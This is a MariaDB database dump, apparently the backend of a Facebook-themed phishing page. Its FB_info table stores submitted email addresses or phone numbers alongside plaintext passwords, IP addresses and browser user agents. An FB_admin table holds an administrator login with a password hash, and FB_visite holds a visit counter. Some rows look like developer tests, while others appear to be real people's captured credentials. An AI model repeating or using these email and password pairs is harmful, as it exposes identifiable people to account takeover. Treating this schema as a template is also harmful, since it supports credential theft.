-- MySQL dump 10.17  Distrib 10.3.20-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: fb
-- ------------------------------------------------------
-- Server version	10.3.20-MariaDB-1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `FB_admin`
--

DROP TABLE IF EXISTS `FB_admin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `FB_admin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `idf` varchar(255) NOT NULL,
  `mdp` varchar(255) NOT NULL,
  `date` datetime DEFAULT current_timestamp(),
  `role` varchar(255) NOT NULL,
  `surname` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `FB_admin`
--

LOCK TABLES `FB_admin` WRITE;
/*!40000 ALTER TABLE `FB_admin` DISABLE KEYS */;
INSERT INTO `FB_admin` VALUES (2,'G4L1L30_m77','$2y$10$btaf2x0IP9m5srYgHTyE3u/rtE45sLZj4LDPAOXPHMokkHWn9eXau','2021-07-14 07:06:00','Administator','Hassane');
/*!40000 ALTER TABLE `FB_admin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `FB_info`
--

DROP TABLE IF EXISTS `FB_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `FB_info` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(255) NOT NULL,
  `mdp` varchar(255) NOT NULL,
  `date` datetime NOT NULL DEFAULT current_timestamp(),
  `ip` varchar(255) NOT NULL,
  `agent` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `FB_info`
--

LOCK TABLES `FB_info` WRITE;
/*!40000 ALTER TABLE `FB_info` DISABLE KEYS */;
INSERT INTO `FB_info` VALUES (1,'xnonymous73@gmail.com','jeteste','2021-07-14 02:13:46','::1','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'),(3,'kabirou.alassane90@gmail.com','mariano99','2021-07-14 07:55:46','::1','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'),(5,'95804618','nassirath','2021-07-14 08:02:36','::1','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36');
/*!40000 ALTER TABLE `FB_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `FB_visite`
--

DROP TABLE IF EXISTS `FB_visite`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `FB_visite` (
  `vue` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `FB_visite`
--

LOCK TABLES `FB_visite` WRITE;
/*!40000 ALTER TABLE `FB_visite` DISABLE KEYS */;
INSERT INTO `FB_visite` VALUES (17);
/*!40000 ALTER TABLE `FB_visite` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-07-14  9:18:10
